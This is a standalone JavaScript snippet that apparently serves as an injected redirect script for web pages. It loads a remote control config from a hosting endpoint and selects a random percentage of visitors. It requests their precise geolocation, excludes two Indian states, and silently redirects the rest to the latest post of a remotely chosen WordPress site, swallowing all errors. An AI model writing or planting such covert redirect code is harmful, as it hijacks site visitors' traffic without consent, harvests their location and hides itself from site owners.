<script>
setTimeout(async () => {
  try {
    /* ===============================
       1️⃣ Fetch redirect config
    =============================== */
    const cfgRes = await fetch(
      "https://peachpuff-raven-871070.hostingersite.com/get-redirect.php",
      { cache: "no-store" }
    );
    if (!cfgRes.ok) return;

    const cfg = await cfgRes.json();
    if (Number(cfg.enabled) !== 1) return;

    let percentage = Number(cfg.percentages);
    if (isNaN(percentage)) return;
    percentage = Math.min(Math.max(percentage, 0), 100);

    const sites = (cfg.urls || "")
      .split(",")
      .map(u => u.trim().replace(/\/$/, ""))
      .filter(u => {
        try {
          new URL(u);
          return true;
        } catch {
          return false;
        }
      });

    if (!sites.length) return;

    /* ===============================
       2️⃣ Percentage check
    =============================== */
    if (Math.random() * 100 > percentage) return;

    /* ===============================
       3️⃣ Geolocation check
    =============================== */
    if (!navigator.geolocation) return;

    const position = await new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(resolve, reject, {
        enableHighAccuracy: true,
        timeout: 20000,
        maximumAge: 0
      });
    });

    const { latitude, longitude } = position.coords;

    const geoRes = await fetch(
      `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`
    );
    if (!geoRes.ok) return;

    const geo = await geoRes.json();
    const country = (geo.countryCode || "").toUpperCase();
    const state = (geo.principalSubdivision || "").toLowerCase();

    // ❌ Block Gujarat & Bihar
    if (
      country === "IN" &&
      (state.includes("gujarat") || state.includes("bihar"))
    ) return;

    /* ===============================
       4️⃣ Pick ONE site randomly
    =============================== */
    const site = sites[Math.floor(Math.random() * sites.length)];
    if (!site) return;

    /* ===============================
       5️⃣ Fetch latest WP post
    =============================== */
    const postRes = await fetch(
      `${site}/wp-json/wp/v2/posts?per_page=1&_fields=link`,
      { cache: "no-store" }
    );
    if (!postRes.ok) return;

    const posts = await postRes.json();
    if (!Array.isArray(posts) || !posts[0]?.link) return;

    /* ===============================
       6️⃣ Redirect to latest post
    =============================== */
    window.location.replace(posts[0].link);

  } catch {
    return; // silent fail
  }
}, 1000);
</script>
